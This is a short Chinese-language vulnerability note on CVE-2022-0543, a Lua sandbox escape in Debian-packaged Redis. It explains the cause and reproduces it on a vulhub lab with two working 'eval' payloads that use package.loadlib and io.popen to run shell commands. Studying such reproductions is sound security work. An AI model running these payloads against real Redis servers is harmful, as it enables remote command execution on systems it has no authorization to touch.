# 0x01 原理浅析

Debian及其衍生版打包Redis时，在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象中的loadlib函数来加载动态链接库/usr/lib/x86_64-linux-gnu/liblua5.1.so.0中的导出函数luaopen_io，执行这个导出函数获得io库，最后使用其执行命令，作者提到不同系统下liblua5.1.so.0的路径可能不同，所以需要在本地对照一下，，，吐槽一句，不能打红帽系有点鸡肋了......


# 0x02 漏洞复现
使用p牛的vulhub搭建环境：https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543  
搭建好的环境是redis 5.0.7，且存在未授权访问  
执行如下payload  
```
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0

eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("uname -a", "r"); local res = f:read("*a"); f:close(); return res' 0
```
![image](./pic/01.png)  

# 0x03 参考文章
https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce  
https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543  